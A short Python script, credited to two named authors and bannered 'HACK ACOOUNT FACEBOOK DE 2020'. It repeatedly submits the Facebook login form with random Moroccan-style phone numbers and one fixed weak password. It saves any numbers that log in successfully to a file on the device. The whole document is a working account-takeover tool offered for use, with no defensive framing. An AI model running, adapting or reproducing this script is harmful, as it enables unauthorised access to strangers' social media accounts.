import mechanize
import random
import time
import os
import sys
a="\033[1;91m"
b="\033[1;93m"
c="\033[1;95m"
d="\033[1;97m"
phone = "06"
bougrina = input(b+"Entre [m] or [free] >>> "+a)
mohamed = "20202020"
file = open("/sdcard/account.txt","w")
print(" ")
url = 'http://'+bougrina+'.facebook.com/login.php'
print(" ")
print(url)
print(" ")
time.sleep(4)
os.system('clear')
print(d+'''╔═══╗╔═══╗╔═══╗╔═══╗╔══╗─╔═══╗╔═══╗╔╗╔═╗
║╔══╝║╔═╗║║╔═╗║║╔══╝║╔╗║─║╔═╗║║╔═╗║║║║╔╝
║╚══╗║║─║║║║─╚╝║╚══╗║╚╝╚╗║║─║║║║─║║║╚╝╝─
║╔══╝║╚═╝║║║─╔╗║╔══╝║╔═╗║║║─║║║║─║║║╔╗║─
║║───║╔═╗║║╚═╝║║╚══╗║╚═╝║║╚═╝║║╚═╝║║║║╚╗
╚╝───╚╝─╚╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚╝╚═╝''')
print(" ")
print(a+"♕ HACK"+b+" ACOOUNT"+c+" FACEBOOK DE 2020 ♕ "+d)
print(" ")
print("[+] "+a+"script by"+b+" Omar Ait Ben Hamou "+c+"and"+b+" mohamed bougrina ©"+c)
print(" ")
while 1:
    time.sleep(1)
    hack= str(random.randint(12345678,87654321))
    number = str(phone+hack)
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
    browser.set_handle_refresh(False)

    url = 'http://'+bougrina+'.facebook.com/login.php'
    browser.open(url)
    browser.select_form(nr = 0)       #This is login-password form -> nr = number = 0
    browser.form['email'] = (number)
    browser.form['pass'] = (mohamed)
    response = browser.submit()
    if 'regular_login' in str(response.read()):
        acc = "[Logged in ✓]>>"+c+" "+number+a+"   [Password ✓]>>"+b+" 20202020"+d
        file.write("\n"+acc+"\n")
        print(acc)
    else:
        print(c+"["+b+"PHONE"+a+"]"+b+">TO FAIL>"+c+" "+number+a+"<=>["+c+"PASSWORD"+a+"]"+c+" >>"+a+"20202020"+d)